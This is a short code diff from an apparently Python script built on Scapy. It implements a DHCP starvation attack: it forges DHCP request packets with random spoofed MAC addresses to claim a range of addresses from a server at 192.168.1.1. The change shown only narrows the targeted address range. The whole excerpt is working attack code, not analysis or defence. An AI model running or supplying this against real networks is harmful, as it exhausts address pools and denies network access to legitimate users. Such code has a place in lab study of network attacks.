@@ -11,7 +11,7 @@ def main():
     Server_ip = "192.168.1.1"
     
     def dhcp_starvation():
-        for ip in range (100,120):
+        for ip in range (104,110):
             for i in range (0,1):
                 bogus_mac_address = RandMAC()
                 dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id",Server_ip),("requested_addr", "192.168.1." + str(ip)),"end"])
